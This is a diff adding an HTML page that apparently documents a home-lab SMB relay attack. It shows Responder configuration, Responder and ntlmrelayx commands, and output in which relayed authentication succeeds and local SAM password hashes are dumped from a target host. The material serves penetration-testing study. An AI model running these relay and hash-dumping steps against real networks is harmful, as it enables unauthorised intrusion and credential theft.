@@ -1,0 +1,77 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title> SMB Relay Attack Demonstration Part 1</title>
+</head><body><br/>
+We need to configure our Responder file using this command :<br/>
+gedit /etc/responder/Responder.conf<br/>
+<br/>
+We need to turn off the SMB and HTTP <br/>
+<img height="502" src="screenshot 2023-03-05 144251.png" width="600"/><br/>
+<br/>
+Now will run the responder using this command :<br/>
+<b>responder -I eth 0 -dwv</b><br/>
+<br/>
+<img height="650" src="screenshot 2023-03-06 133514.png" width="523"/><br/>
+<br/>
+<img height="437" src="screenshot 2023-03-06 133547.png" width="600"/><br/>
+<br/>
+<br/>
+Now we have to set the relay and trigger it using the attacker ip address (i.e. 192.168.205.128) in our case.<br/>
+<br/>
+┌──(root㉿kali)-[/home/kali]<br/>
+└─# ntlmrelayx.py -tf targets.txt -smb2support         <br/>
+Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation<br/>
+<br/>
+[*] Protocol Client SMTP loaded..<br/>
+[*] Protocol Client LDAP loaded..<br/>
+[*] Protocol Client LDAPS loaded..<br/>
+/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.<br/>
+[*] Protocol Client MSSQL loaded..<br/>
+[*] Protocol Client SMB loaded..<br/>
+[*] Protocol Client IMAPS loaded..<br/>
+[*] Protocol Client IMAP loaded..<br/>
+[*] Protocol Client HTTPS loaded..<br/>
+[*] Protocol Client HTTP loaded..<br/>
+[*] Running in relay mode to hosts in targetfile<br/>
+[*] Setting up SMB Server<br/>
+[*] Setting up HTTP Server<br/>
+<br/>
+[*] Servers started, waiting for connections<br/>
+[*] SMBD-Thread-3: Received connection from 192.168.205.138, attacking target smb://192.168.205.141<br/>
+[*] Authenticating against smb://192.168.205.141 as MARVEL\fcastle SUCCEED<br/>
+[*] SMBD-Thread-5: Received connection from 192.168.205.138, attacking target smb://192.168.205.141<br/>
+[*] Authenticating against smb://192.168.205.141 as MARVEL\fcastle SUCCEED<br/>
+[*] SMBD-Thread-7: Received connection from 192.168.205.138, attacking target smb://192.168.205.141<br/>
+[*] Service RemoteRegistry is in stopped state<br/>
+[*] Service RemoteRegistry is in stopped state<br/>
+[*] Authenticating against smb://192.168.205.141 as MARVEL\fcastle SUCCEED<br/>
+[*] Service RemoteRegistry is disabled, enabling it<br/>
+[*] Starting service RemoteRegistry<br/>
+[*] Starting service RemoteRegistry<br/>
+[-] SCMR SessionError: code: 0x420 - ERROR_SERVICE_ALREADY_RUNNING - An instance of the service is already running.<br/>
+[*] Target system bootKey: 0x85f4d92d0259fe3f8c7e56a65e309d5b<br/>
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)<br/>
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:cfce6de138c94111e43b26d73438d4ab:::<br/>
+Peter Parker:1001:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::<br/>
+[*] Done dumping SAM hashes for host: 192.168.205.141<br/>
+[*] Target system bootKey: 0x85f4d92d0259fe3f8c7e56a65e309d5b<br/>
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)<br/>
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:cfce6de138c94111e43b26d73438d4ab:::<br/>
+Peter Parker:1001:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::<br/>
+[*] Done dumping SAM hashes for host: 192.168.205.141<br/>
+[*] Stopping service RemoteRegistry<br/>
+[*] Restoring the disabled state for service RemoteRegistry<br/>
+<br/>
+<br/>
+<img src="screenshot 2023-03-06 133627.png"/><br/>
+<br/>
+From here we can move laterally or vertically.<br/>
+<br/>
+</body></html>
